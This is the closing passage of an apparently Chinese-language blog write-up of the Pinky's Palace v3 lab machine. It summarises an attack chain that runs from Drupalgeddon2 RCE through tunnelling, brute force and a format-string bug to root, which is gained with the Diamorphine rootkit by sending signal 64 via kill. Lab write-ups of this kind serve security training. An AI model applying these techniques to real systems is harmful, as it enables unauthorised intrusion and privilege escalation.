这里我讲下 Diamorphine 的原理... 其中的命令可以在上面的链接里有...Diamorphine rootkit 的 kit 功能是发送信号 64（到任何的 pid）然后使当前用户成为 root 用户，可以使用 kill 命令将信号发送到任何进程（任何 pid 都会起作用）... 记住这个方法...

成功拿到 root 权限并查看了 flag....

![](https://mmbiz.qpic.cn/mmbiz_png/jU2bISnUvibnZbnibN8FBQH5OCbpy2RiaqvN4CbAVLGxKnXwKvTYKNBgiavibFHfCtibdicicjjPjKXicZASnmAVicxkRlfw/640?wx_fmt=png)

太难了这台靶机.... 还有 Pinky's Palace: v4 难度... 这才 V3 就花了我两天的时间...

从 Drupalgeddon2 远程代码执行漏洞... 需要加深的是对 EXP 的编写能力...

到 python3 的利用代码渗透... 到使用 socat 工具端口隧道技术... 到九头蛇的爆破... 到分析二进制 pinksecd，利用 libpinksec.so 共享库... 到 pyton 编写恶意程序.... 到缓冲区溢出中 PSMCCLI 程序存在格式字符串漏洞.... 到 SSH 生成密匙外壳.... 最后利用 Diamorphine rootkit 技术... 最终拿到 root 权限...（针对格式字符串漏洞可以参考：

[PDF](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf) 学习）

中间还有非常多的不同方法和方式能拿到低权，在破解 pin 值登录 web 页面也可以用 wfuzz.... 以及缓冲区溢出中 PSMCCLI 程序也可以用 printf... 进行格式字符串漏洞利用进行溢出插入 shellcode... 等等等等，这是非常好的一台靶机，可以玩几天...

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/VJt1QibEWNRfO10Oo0PkHSmDL3qXfsGFDH88uPmn8CgjBFdpap6TpyH2RSslx4l1ZLlas24L9zibRj0RMyoXib4QA/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)